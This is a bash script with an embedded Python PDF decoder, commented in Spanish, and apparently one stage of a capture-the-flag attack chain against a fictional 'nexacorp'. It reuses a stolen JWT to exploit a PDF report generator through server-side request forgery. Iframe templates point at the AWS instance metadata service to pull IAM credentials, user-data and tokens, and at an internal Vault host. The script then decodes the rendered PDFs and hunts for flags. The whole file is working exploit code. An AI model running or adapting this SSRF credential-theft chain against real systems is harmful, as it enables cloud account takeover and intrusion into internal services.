#!/usr/bin/env bash
# Stage 4 — SSRF a AWS IAM creds + decode CMap en una pasada
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWT=$(cat "${LOOT_DIR}/stage2_access_token.jwt")

echo "[*] Verificando JWT..."
me=$(curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"{ me { id role } }"}' | jq -c)
echo "    me=${me}"
echo

# Lista de targets a probar
TARGETS=(
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/dynamic/instance-identity/document"
  "http://169.254.169.254/latest/user-data"
  "http://169.254.169.254/latest/api/token"
  "http://internal-vault.nexacorp.local:8200/v1/sys/health"
)

mkdir -p "${LOOT_DIR}/stage4_pdfs"

for t in "${TARGETS[@]}"; do
  label=$(echo "${t}" | tr '/:.' '_' | head -c 80)
  echo "[*] Generando PDF para: ${t}"
  TPL="<html><body style='margin:0'><iframe src='${t}' width='1200' height='2000' style='border:none'></iframe></body></html>"
  curl -s -X POST "${API_URL}/api/v2/reports/generate" \
    -H "Authorization: Bearer ${JWT}" \
    -H "Content-Type: application/json" \
    -d "$(jq -n --arg t "${TPL}" '{template:$t}')" \
    -o "${LOOT_DIR}/stage4_pdfs/${label}.json"
  size=$(jq -r '.pdf_size_bytes // 0' "${LOOT_DIR}/stage4_pdfs/${label}.json" 2>/dev/null || echo 0)
  echo "    pdf_size=${size}"
done

echo
echo "[*] Decodificando con CMap parser..."
echo

cd "${LOOT_DIR}/stage4_pdfs"

python3 <<'PYEOF'
import os, re, zlib, base64, json

def decompress_streams(pdf):
    out = []
    for s in re.findall(rb'stream\r?\n(.*?)\r?\nendstream', pdf, re.DOTALL):
        try: out.append(zlib.decompress(s.strip(b'\r\n ')))
        except: out.append(s)
    return out

def parse_cmap(streams):
    table = {}
    for s in streams:
        if b'beginbfchar' not in s and b'beginbfrange' not in s: continue
        try: text = s.decode('latin-1')
        except: continue
        for block in re.findall(r'beginbfchar(.*?)endbfchar', text, re.DOTALL):
            for line in block.split('\n'):
                for code, uni in re.findall(r'<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>', line):
                    try:
                        c = int(code, 16)
                        u = bytes.fromhex(uni).decode('utf-16-be', errors='replace')
                        table[c] = u
                    except: pass
        for block in re.findall(r'beginbfrange(.*?)endbfrange', text, re.DOTALL):
            for line in block.split('\n'):
                for s_, e_, u_ in re.findall(r'<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>', line):
                    try:
                        sn, en = int(s_, 16), int(e_, 16)
                        u_int = int.from_bytes(bytes.fromhex(u_), 'big')
                        for i, code in enumerate(range(sn, en+1)):
                            table[code] = chr(u_int + i)
                    except: pass
    return table

def extract(pdf_bytes):
    streams = decompress_streams(pdf_bytes)
    cmap = parse_cmap(streams)
    out = []
    for s in streams:
        for m in re.findall(rb'\(((?:\\.|[^\\()])*)\)\s*Tj', s, re.DOTALL):
            for byte in m:
                out.append(cmap.get(byte, chr(byte)))
            out.append(' ')
        for arr in re.findall(rb'\[(.*?)\]\s*TJ', s, re.DOTALL):
            for sm in re.findall(rb'\(((?:\\.|[^\\()])*)\)', arr, re.DOTALL):
                for byte in sm:
                    out.append(cmap.get(byte, chr(byte)))
                out.append(' ')
    return ''.join(out)

flags = set()
for fname in sorted(os.listdir('.')):
    if not fname.endswith('.json'): continue
    try:
        d = json.load(open(fname))
        size = d.get('pdf_size_bytes', 0)
        b64 = d.get('pdf_base64', '')
        if not b64: continue
        pdf = base64.b64decode(b64)
        text = extract(pdf)
        print(f"\n{'='*70}")
        print(f"FILE: {fname}")
        print(f"PDF_SIZE: {size}")
        print(f"{'='*70}")
        print(text[:3000])
        for m in re.findall(r'FLAG\{[^}]+\}', text):
            flags.add(m)
    except Exception as e:
        print(f"[!] {fname}: {e}")

print()
print("="*70)
print(f"FLAGS ENCONTRADAS: {len(flags)}")
print("="*70)
for f in sorted(flags):
    print(f"  {f}")
PYEOF
